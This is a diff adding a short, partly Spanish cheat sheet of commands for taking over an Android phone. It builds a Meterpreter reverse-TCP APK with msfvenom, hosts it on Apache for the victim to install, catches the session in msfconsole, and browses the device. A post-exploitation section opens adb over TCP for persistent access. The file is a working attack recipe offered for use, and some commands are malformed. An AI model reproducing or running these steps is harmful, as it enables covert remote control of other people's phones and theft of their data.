@@ -1,0 +1,66 @@
+msfvenom -p android/meterpreter/reverse_tcp LHOST LPORT R > hacktoandroid.apk
+mv hacktoandroid.apk /var/www/html/
+cd /var/www/html
+service apache2 start
+install
+instalar en el android
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST
+set LPORT
+exploit
+sessions
+sysinfo
+help
+getuid
+app_list
+app_run com.google.android.youtube
+sysinfo
+shell
+ls -l
+cd /
+cd sdcard
+cd Download
+ls -l
+whoami
+cd nmap-7.12
+ls -l
+nmap
+./nmap
+
+#POST EXPLOIT#
+
+1- Establecer conexion
+2-Shell
+3- use sdcard
+para permitir ejecución de otras herramientas
+4- usar adb
+comando para mantener persisttencia
+En el android con shell activada digitar
+setprop.service.adb.tcp.port 5555
+parar servicio
+stop adbd
+start adbd
+En otra terminal del kali>
+adb connect 192.168.1.15
+adb devices
+adb shell
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
